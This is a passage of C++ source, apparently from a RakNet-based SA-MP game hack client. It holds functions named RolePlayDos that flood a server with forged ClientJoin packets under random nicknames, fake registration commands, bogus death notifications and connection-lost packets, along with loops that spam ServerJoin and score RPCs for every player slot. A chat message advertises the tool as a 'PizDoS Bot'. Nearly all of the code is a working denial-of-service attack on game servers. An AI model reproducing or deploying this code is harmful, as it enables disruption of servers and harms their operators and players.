RakNet::BitStream bsvehicleDestroyed31;
RakNet::BitStream bsvehicleDestroyed41;
RakNet::BitStream bsvehicleDestroyed51;
RakNet::BitStream bsvehicleDestroyed61;
RakNet::BitStream bsvehicleDestroyed111;
bsvehicleDestroyed1.Write(a);
bsvehicleDestroyed2.Write(a);
bsvehicleDestroyed3.Write(a);
bsvehicleDestroyed4.Write(a);
bsvehicleDestroyed5.Write(a);
bsvehicleDestroyed6.Write(a);
bsvehicleDestroyed.Write(a);
bsvehicleDestroyed11.Write(a);
bsvehicleDestroyed21.Write(a);
bsvehicleDestroyed31.Write(a);
bsvehicleDestroyed41.Write(a);
bsvehicleDestroyed51.Write(a);
bsvehicleDestroyed61.Write(a);
bsvehicleDestroyed111.Write(a);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed1, SYSTEM_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed2, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed3, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed4, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed5, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed6, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed11, SYSTEM_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed21, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed31, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed41, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed51, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed61, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
pRakClient->RPC(&RPC_WorldVehicleAdd, &bsvehicleDestroyed111, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
}}

void test251() 
{
	for(int a=0;a<MAX_PLAYERS;a++)
	{
		RakNet::BitStream bsvehicleDestroyed1;
		RakNet::BitStream bsvehicleDestroyed2;
		RakNet::BitStream bsvehicleDestroyed3;
		RakNet::BitStream bsvehicleDestroyed4;
		RakNet::BitStream bsvehicleDestroyed5;
		RakNet::BitStream bsvehicleDestroyed6;
		RakNet::BitStream bsvehicleDestroyed;
		bsvehicleDestroyed1.Write(a);
		bsvehicleDestroyed2.Write(a);
		bsvehicleDestroyed3.Write(a);
		bsvehicleDestroyed4.Write(a);
		bsvehicleDestroyed5.Write(a);
		bsvehicleDestroyed6.Write(a);
		bsvehicleDestroyed.Write(a);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed1, SYSTEM_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed2, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed3, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed4, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed5, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed6, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	}	
}

void test254() 
{
	for(int a=0;a<MAX_PLAYERS;a++)
	{
		RakNet::BitStream bsvehicleDestroyed1;
		RakNet::BitStream bsvehicleDestroyed2;
		RakNet::BitStream bsvehicleDestroyed3;
		RakNet::BitStream bsvehicleDestroyed4;
		RakNet::BitStream bsvehicleDestroyed5;
		RakNet::BitStream bsvehicleDestroyed6;
		RakNet::BitStream bsvehicleDestroyed;
		bsvehicleDestroyed1.Write(a++);
		bsvehicleDestroyed2.Write(a++);
		bsvehicleDestroyed3.Write(a++);
		bsvehicleDestroyed4.Write(a++);
		bsvehicleDestroyed5.Write(a++);
		bsvehicleDestroyed6.Write(a++);
		bsvehicleDestroyed.Write(a++);
		//pRakClient->RPC(&RPC_Test, &bsvehicleDestroyed1, PacketPriority(rand()%3+1), RELIABLE, rand()%3+1, 100, UNASSIGNED_NETWORK_ID, NULL);
		//pRakClient->RPC(&RPC_Test, &bsvehicleDestroyed2, PacketPriority(rand()%3+1), RELIABLE, rand()%3+1, 100, UNASSIGNED_NETWORK_ID, NULL);
		//pRakClient->RPC(&RPC_Test, &bsvehicleDestroyed3, PacketPriority(rand()%3+1), RELIABLE, rand()%3+1, 100, UNASSIGNED_NETWORK_ID, NULL);
		//pRakClient->RPC(&RPC_Test, &bsvehicleDestroyed4, PacketPriority(rand()%3+1), RELIABLE, rand()%3+1, 100, UNASSIGNED_NETWORK_ID, NULL);
		//pRakClient->RPC(&RPC_Test, &bsvehicleDestroyed5, PacketPriority(rand()%3+1), RELIABLE, rand()%3+1, 100, UNASSIGNED_NETWORK_ID, NULL);
		//pRakClient->RPC(&RPC_Test, &bsvehicleDestroyed6, PacketPriority(rand()%3+1), RELIABLE, rand()%3+1, 100, UNASSIGNED_NETWORK_ID, NULL);
		//pRakClient->RPC(&RPC_Test, &bsvehicleDestroyed, PacketPriority(rand()%3+1), RELIABLE, rand()%3+1, 100, UNASSIGNED_NETWORK_ID, NULL);


	//for(int s=0;s<52;s++){
	//SendWastedNotification(s, 222222);
	}
}

void test257() 
{
	iConnectionRequested = 0;
	iConnectionRequested = 0;
	iConnectionRequested = 0;
	iConnectionRequested = 0;
	iConnectionRequested = 0;
	iConnectionRequested = 0;
	iConnectionRequested = 0;
	iConnectionRequested = 0;
	iConnectionRequested = 0;
	iConnectionRequested = 0;
}

void test256() 
{

}


void RolePlayDos1() 
{
	for(int ccflood = 0; ccflood < 20;ccflood++)
	{
	char nick[24] = {0};
	char number[5];
	gen_random(number, 5);
	sprintf(nick, "%s_Hf%s", g_szNickName, number);
	RakNet::BitStream bsSend;
	char *pszAuthBullshit = AUTH_BS;
	int iVersion = NETGAME_VERSION;
	BYTE byteMod = 1;
	BYTE byteNameLen = (BYTE)strlen(nick);
	BYTE byteAuthBSLen = (BYTE)strlen(pszAuthBullshit);
	unsigned int uiClientChallengeResponse = playerInfo->uiChallenge ^ iVersion;
	
	bsSend.Write((int)33563352);
	bsSend.Write(byteMod);
	bsSend.Write(byteNameLen);
	bsSend.Write(nick, byteNameLen);
	bsSend.Write(uiClientChallengeResponse);
	bsSend.Write(byteAuthBSLen);
	bsSend.Write(pszAuthBullshit, byteAuthBSLen);
	pRakClient->RPC(&RPC_ClientJoin, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	sendChat("++++Zeta-Hack.ru++++ PizDoS Bot by AlexDrift");
}
}

void RolePlayDos2() 
{
	for(int ccflood = 0; ccflood < 20;ccflood++)
	{
		char nick[15] = {0};
		gen_random(nick, 15);
		RakNet::BitStream bs;

	RakNet::BitStream bsSend;
	char *pszAuthBullshit = AUTH_BS;
	int iVersion = NETGAME_VERSION;
	BYTE byteMod = 1;
	BYTE byteNameLen = (BYTE)strlen(nick);
	BYTE byteAuthBSLen = (BYTE)strlen(pszAuthBullshit);
	unsigned int uiClientChallengeResponse = playerInfo->uiChallenge ^ iVersion;
	
	bsSend.Write((int)33563352);
	bsSend.Write(byteMod);
	bsSend.Write(byteNameLen);
	bsSend.Write(nick, byteNameLen);
	bsSend.Write(uiClientChallengeResponse);
	bsSend.Write(byteAuthBSLen);
	bsSend.Write(pszAuthBullshit, byteAuthBSLen);
	pRakClient->RPC(&RPC_ClientJoin, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		bs.Write((BYTE)ID_CONNECTION_LOST);
		pRakClient->Send(&bs, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
	}
}


void RolePlayDos3() 
{
	for(int ccflood = 0; ccflood < 20;ccflood++)
	{
		char nick[15] = {0};
		gen_random(nick, 15);

	RakNet::BitStream bsSend;
	char *pszAuthBullshit = AUTH_BS;
	int iVersion = NETGAME_VERSION;
	BYTE byteMod = 1;
	BYTE byteNameLen = (BYTE)strlen(nick);
	BYTE byteAuthBSLen = (BYTE)strlen(pszAuthBullshit);
	unsigned int uiClientChallengeResponse = playerInfo->uiChallenge ^ iVersion;
	
	bsSend.Write((int)33563352);
	bsSend.Write(byteMod);
	bsSend.Write(byteNameLen);
	bsSend.Write(nick, byteNameLen);
	bsSend.Write(uiClientChallengeResponse);
	bsSend.Write(byteAuthBSLen);
	bsSend.Write(pszAuthBullshit, byteAuthBSLen);
	pRakClient->RPC(&RPC_ClientJoin, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		sendDialogResponse(sampDialog.wDialogID, 1, 0, "wqqwqq12345");
		sendServerCommand("/register qwqwqwqw211211");
	}		
}

void RolePlayDos11(PLAYERID iPlayerID) 
{

}

void RolePlayDos21() 
{
	for(int a=0;a<MAX_PLAYERS;a++)
	{
		RakNet::BitStream bsvehicleDestroyeda;
		RakNet::BitStream bsvehicleDestroyedad;
		RakNet::BitStream bsvehicleDestroyedads;
		bsvehicleDestroyeda.Write(bsvehicleDestroyeda);
		bsvehicleDestroyedad.Write(bsvehicleDestroyedad);
		bsvehicleDestroyedads.Write(a);
		pRakClient->RPC(&RPC_Spawn, &bsvehicleDestroyeda, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyedads, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_Spawn, &bsvehicleDestroyedad, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	}
}

void RolePlayDos31() 
{
	SendWastedNotification(22222, 22222);
}

void RolePlayDos32() 
{
for(int a=0;a<MAX_PLAYERS;a++)
	{
		RakNet::BitStream bsvehicleDestroyeda;
		RakNet::BitStream bsvehicleDestroyedad;
		RakNet::BitStream bsvehicleDestroyedads;
		bsvehicleDestroyeda.Write(bsvehicleDestroyeda);
		bsvehicleDestroyedad.Write(bsvehicleDestroyedad);
		bsvehicleDestroyedads.Write(a); 
		pRakClient->RPC(&RPC_Spawn, &bsvehicleDestroyeda, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyedads, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_Spawn, &bsvehicleDestroyedad, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
	}		
}

void RolePlayDos3d() 
{
for(int a=0;a<MAX_PLAYERS;a++)
	{

		RakNet::BitStream bsvehicleDestroyed1;
		RakNet::BitStream bsvehicleDestroyed2;
		RakNet::BitStream bsvehicleDestroyed3;
		RakNet::BitStream bsvehicleDestroyed4;
		RakNet::BitStream bsvehicleDestroyed5;
		RakNet::BitStream bsvehicleDestroyed6;
		RakNet::BitStream bsvehicleDestroyed;

		RakNet::BitStream bsvehicleDestroyed1q;
		RakNet::BitStream bsvehicleDestroyed2q;
		RakNet::BitStream bsvehicleDestroyed3q;
		RakNet::BitStream bsvehicleDestroyed4q;
		RakNet::BitStream bsvehicleDestroyed5q;
		RakNet::BitStream bsvehicleDestroyed6q;
		RakNet::BitStream bsvehicleDestroyedq;


		bsvehicleDestroyed1.Write(a);
		bsvehicleDestroyed2.Write(a);
		bsvehicleDestroyed3.Write(a);
		bsvehicleDestroyed4.Write(a);
		bsvehicleDestroyed5.Write(a);
		bsvehicleDestroyed6.Write(a);
		bsvehicleDestroyed.Write(a);

		bsvehicleDestroyed1q.Write(a);
		bsvehicleDestroyed2q.Write(a);
		bsvehicleDestroyed3q.Write(a);
		bsvehicleDestroyed4q.Write(a);
		bsvehicleDestroyed5q.Write(a);
		bsvehicleDestroyed6q.Write(a);
		bsvehicleDestroyedq.Write(a);


		//pRakClient->RPC(&RPC_ClickTextDraw, &bsvehicleDestroyed1, SYSTEM_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed2, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed3, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed4, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed5, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed6, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);

		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed1q, SYSTEM_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed2q, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed3q, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed4q, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed5q, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyed6q, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ServerJoin, &bsvehicleDestroyedq, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);







		/*RakNet::BitStream bsvehicleDestroyed1;
		RakNet::BitStream bsvehicleDestroyed2;
		RakNet::BitStream bsvehicleDestroyed3;
		RakNet::BitStream bsvehicleDestroyed4;
		RakNet::BitStream bsvehicleDestroyed5;
		RakNet::BitStream bsvehicleDestroyed6;
		RakNet::BitStream bsvehicleDestroyed;

		RakNet::BitStream bsvehicleDestroyed1q;
		RakNet::BitStream bsvehicleDestroyed2q;
		RakNet::BitStream bsvehicleDestroyed3q;
		RakNet::BitStream bsvehicleDestroyed4q;
		RakNet::BitStream bsvehicleDestroyed5q;
		RakNet::BitStream bsvehicleDestroyed6q;
		RakNet::BitStream bsvehicleDestroyedq;


		bsvehicleDestroyed1.Write(a);
		bsvehicleDestroyed2.Write(a);
		bsvehicleDestroyed3.Write(a);
		bsvehicleDestroyed4.Write(a);
		bsvehicleDestroyed5.Write(a);
		bsvehicleDestroyed6.Write(a);
		bsvehicleDestroyed.Write(a);

		bsvehicleDestroyed1q.Write(a);
		bsvehicleDestroyed2q.Write(a);
		bsvehicleDestroyed3q.Write(a);
		bsvehicleDestroyed4q.Write(a);
		bsvehicleDestroyed5q.Write(a);
		bsvehicleDestroyed6q.Write(a);
		bsvehicleDestroyedq.Write(a);


		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed1, SYSTEM_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_RequestSpawn, &bsvehicleDestroyed2, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed3, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ClickPlayer, &bsvehicleDestroyed4, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ClickTextDraw, &bsvehicleDestroyed5, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MapMarker, &bsvehicleDestroyed6, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_PlayerGiveDamage, &bsvehicleDestroyed, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);

		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed1q, SYSTEM_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_RequestSpawn, &bsvehicleDestroyed2q, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_UpdateScoresPingsIPs, &bsvehicleDestroyed3q, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ClickPlayer, &bsvehicleDestroyed4q, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_ClickTextDraw, &bsvehicleDestroyed5q, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_MapMarker, &bsvehicleDestroyed6q, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		pRakClient->RPC(&RPC_PlayerGiveDamage, &bsvehicleDestroyedq, HIGH_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);*/
}}


void RolePlayDos3dq() 
{
for(int a=0;a<MAX_PLAYERS;a++)
	{
		RakNet::BitStream bsvehicleDestroyed1;
		bsvehicleDestroyed1.Write(a);
		//pRakClient->RPC(&RPC_Test, &bsvehicleDestroyed1, SYSTEM_PRIORITY, RELIABLE_ORDERED, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		

		
}}


void RolePlayDos320() 
{
	for(int ccflood = 0; ccflood < 10;ccflood++)
	{
		char nick[15] = {0};
		gen_random(nick, 15);
	
	RakNet::BitStream bsSend;
	RakNet::BitStream bs;
	char *pszAuthBullshit = AUTH_BS;
	int iVersion = NETGAME_VERSION;
	BYTE byteMod = 1;
	BYTE byteNameLen = (BYTE)strlen(nick);
	BYTE byteAuthBSLen = (BYTE)strlen(pszAuthBullshit);
	unsigned int uiClientChallengeResponse = playerInfo->uiChallenge ^ iVersion;
	
	bsSend.Write((int)33563352);
	bsSend.Write(byteMod);
	bsSend.Write(byteNameLen);
	bsSend.Write(nick, byteNameLen);
	bsSend.Write(uiClientChallengeResponse);
	bsSend.Write(byteAuthBSLen);
	bsSend.Write(pszAuthBullshit, byteAuthBSLen);
	pRakClient->RPC(&RPC_ClientJoin, &bsSend, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		sendDialogResponse(sampDialog.wDialogID, 1, 0, "wqqwqq12345");
		sendServerCommand("/register qwqwqwqw211211");
		RakNet::BitStream bsSpawnRequest;
		bsSpawnRequest.Write(rand()%10);
		pRakClient->RPC(&RPC_RequestClass, &bsSpawnRequest, HIGH_PRIORITY, RELIABLE, 0, FALSE, UNASSIGNED_NETWORK_ID, NULL);
		sendChat("++++Zeta-Hack.ru++++ PizDoS Bot by AlexDrift");
		SendWastedNotification(60, -222222222);
		bs.Write((BYTE)ID_CONNECTION_LOST);
		pRakClient->Send(&bs, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
		RakNet::BitStream bs1Send;
		bs1Send.Write((BYTE)ID_MODIFIED_PACKET);
		pRakClient->Send(&bs1Send, HIGH_PRIORITY, RELIABLE, 0);
	}
}



DWORD dwLastOnFootDataSentTickq = GetTickCount();
int iFollowingPassengerq = 0, iFollowingDriverq = 0;
void SendOnFootFullSyncDataq(ONFOOT_SYNC_DATA *pofSync, int sendDeathNoti, PLAYERID followPlayerID)
{
	if(pofSync == NULL)
		return;

	RakNet::BitStream bsPlayerSync;

	if(dwLastOnFootDataSentTickq && dwLastOnFootDataSentTickq < (GetTickCount() - iNetModeNormalOnfootSendRate))
	{
		if(followPlayerID != (PLAYERID)-1)
		{
			if(!playerInfo[followPlayerID].iIsConnected)
				return;
			if(iFollowingPassengerq || iFollowingDriverq)
				return;

			pofSync->lrAnalog = playerInfo[followPlayerID].onfootData.lrAnalog;
			pofSync->udAnalog = playerInfo[followPlayerID].onfootData.udAnalog;
			pofSync->wKeys = playerInfo[followPlayerID].onfootData.wKeys;

			pofSync->vecPos[0] = playerInfo[followPlayerID].onfootData.vecPos[0] + settings.fFollowXOffset;
			pofSync->vecPos[1] = playerInfo[followPlayerID].onfootData.vecPos[1] + settings.fFollowYOffset;
			pofSync->vecPos[2] = playerInfo[followPlayerID].onfootData.vecPos[2] + settings.fFollowZOffset;

	

			pofSync->fQuaternion[0] = playerInfo[followPlayerID].onfootData.fQuaternion[0] + rand()%320-160;
			pofSync->fQuaternion[1] = playerInfo[followPlayerID].onfootData.fQuaternion[1] + rand()%320-160;
			pofSync->fQuaternion[2] = playerInfo[followPlayerID].onfootData.fQuaternion[2] + rand()%320-160;
			pofSync->fQuaternion[3] = playerInfo[followPlayerID].onfootData.fQuaternion[3] + rand()%320-160;

			pofSync->byteHealth = playerInfo[followPlayerID].onfootData.byteHealth;
			pofSync->byteArmour = playerInfo[followPlayerID].onfootData.byteArmour;
			pofSync->byteCurrentWeapon = playerInfo[followPlayerID].onfootData.byteCurrentWeapon;
			pofSync->byteSpecialAction = playerInfo[followPlayerID].onfootData.byteSpecialAction;

			pofSync->vecMoveSpeed[0] = playerInfo[followPlayerID].onfootData.vecMoveSpeed[0] + rand()%320-160;
			pofSync->vecMoveSpeed[1] = playerInfo[followPlayerID].onfootData.vecMoveSpeed[1] + rand()%320-160;
			pofSync->vecMoveSpeed[2] = playerInfo[followPlayerID].onfootData.vecMoveSpeed[2] + rand()%320-160;

			pofSync->iCurrentAnimationID = playerInfo[followPlayerID].onfootData.iCurrentAnimationID;

			bsPlayerSync.Write((BYTE)ID_PLAYER_SYNC);
			bsPlayerSync.Write((PCHAR)pofSync, sizeof(ONFOOT_SYNC_DATA));
			pRakClient->Send(&bsPlayerSync, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

			if(sendDeathNoti && pofSync->byteHealth == 0)
				SendWastedNotification(0, -1);

			dwLastOnFootDataSentTickq = GetTickCount();
		}
		else
		{
			bsPlayerSync.Write((BYTE)ID_PLAYER_SYNC);
			bsPlayerSync.Write((PCHAR)pofSync, sizeof(ONFOOT_SYNC_DATA));
			pRakClient->Send(&bsPlayerSync, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

			if(sendDeathNoti && pofSync->byteHealth == 0)
				SendWastedNotification(0, -1);

			dwLastOnFootDataSentTickq = GetTickCount();
		}
	}
}